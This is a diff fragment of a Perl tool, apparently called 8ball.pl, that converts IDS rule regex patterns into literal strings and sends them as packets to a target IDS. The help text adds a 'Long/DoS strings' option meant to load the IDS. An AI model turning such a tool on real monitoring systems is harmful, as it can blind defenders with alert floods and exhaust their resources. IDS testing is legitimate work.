+				$pcre =~ s/\[(.).*?\]/\+/ if ($extra =~ '^\+');	
+				$pcre =~ s/\[(.).*?\]/\&/ if ($extra =~ '^\&');		
+				$pcre =~ s/\[(.).*?\]/\=/ if ($extra =~ '^\=');	
+				$pcre =~ s/\[(.).*?\]/\!/ if ($extra =~ '^\!');
+				$pcre =~ s/\[(.).*?\]/\@/ if ($extra =~ '^\@');
+				$pcre =~ s/\[(.).*?\]/\^/ if ($extra =~ '^^');														
+				$pcre =~ s/\[(.).*?\]/\ / if ($extra =~ '^\ ');
+				$pcre =~ s/\[(.).*?\]/\t/ if ($extra =~ '^t');				
+				#gracefully handle unicode, results are a failure, but prevents infinite loop
+				$pcre =~ s/\[(.).*?\]/\u/ if ($extra =~ '^u');														
+			} else {
+				$pcre =~ s/\[(.).*?\]/$class/;
+			}
+		}
+	}
+
+	#handle {}'s, take the only or last number and repeat that many times munus 1, unless it's greater than 50, then just do 50
+	#This one is probably the most complicated, must be done before ()'s
+	while ($pcre =~ /(\))?\{(\d).*?\}/s){			#while maybe preceded by ) - a { - followed by digit - then anything to last }
+		my $grouper = $1;	#may be )
+		my $digit = $+;		#the first digit
+		my $char;
+		my $digit2 = '';
+		if (!$grouper) {	#If it's atomic: a{1,4}
+			if ($pcre =~ /(.)\{(\d+)(.*?)\}/s) {	#get the atom and first digit and possibly 2nd digit
+				$char = $1;						#atom
+				$digit = $2;					#first digit
+				if ($3) {
+					$digit2 = $3;
+					if ($digit2 =~ /(\d+)/) {
+						$digit2 = $1;
+						if ($digit2 > ($qlimit - 1)) {
+							$digit2 = $qlimit;
+						}
+						$digit2--;						
+						$char = $char x $digit2;
+					} else {
+						$char = $char x $digit;
+					}
+				} else {
+					$char = $char x $digit;
+				}
+			}
+			if ($char eq '') {
+				$pcre =~ s/\{(\d).*?\}//s;
+			} else { 
+				$pcre =~ s/.\{(\d).*?\}/$char/s;
+			}
+		} else {
+			if ($pcre =~ /(\(.+?\))\{(\d+)(.*?)\}/s) {
+				$char = $1;
+				$digit = $2;
+				if ($3) {
+					$digit2 = $3;
+					if ($digit2 =~ /(\d+)/) {
+						$digit2 = $1;
+						if ($digit2 > ($qlimit - 1)) {
+							$digit2 = $qlimit;
+						}
+						$digit2--;
+						$char = $char x $digit2;
+					} else {
+						$char = $char x $digit;
+					}
+				} else {
+					$char = $char x $digit;
+				}	
+			}
+			$pcre =~ s/(\(.+?\))\{(\d).*?\}/$char/s;
+		}
+	}
+
+	#handle grouping ()'s, take the last alternation in ()'s
+	while ($pcre =~ /\(([^)]+?)\|.+?\)/s){		#while we still have a group
+
+		#Do something with it
+		#$pcre =~ s/\((.+?)\|.+?\)/$1/; 		#this replaces with first option
+		$pcre =~ s/\(.+?\|([^|]*?)\)/$1/s;			#this replaces with last option
+	}
+
+	#remove gratuitus parenthesis
+	$pcre =~ s/\(|\)//g;
+
+	#Reintroduce tokenized metacharacters as literal
+	$pcre =~ s/$openparentoken/(/g;
+	$pcre =~ s/$closeparentoken/)/g;
+	$pcre =~ s/$opensquaretoken/[/g;
+	$pcre =~ s/$closesquaretoken/]/g;
+	$pcre =~ s/$openbracetoken/{/g;
+	$pcre =~ s/$closebracetoken/}/g;	
+	$pcre =~ s/$alternativetoken/|/g;	
+
+	return $pcre;					
+}
+
 
 sub help {
 	print "NAME\n";
@@ -366,6 +828,8 @@ sub help {
 	print "\t-d: You can set a delay between each packet, depending on the network performance of the target, packets will drop if you run this too quickly. This is measured in microseconds.\n";
 	print "\t-h: Limiting rules to only coming from \$HOME_NET; when using 8ball to target external source to trigger internal IDS";
 	print "\t-e: Limiting rules to only coming from \$EXTERNAL_NET; when using 8ball to target IDS from the outside";
+	print "\t-l: Long/DoS strings, less alerts / more resource usage for IDS\n";
+	print "\t-s: Silent Mode; don't print all that colorful stuff onscreen\n";
 	print "EXAMPLES\n";
 	print "\t8ball.pl -t 192.168.0.42 -r rules.download -d 10000\n";
 	exit;
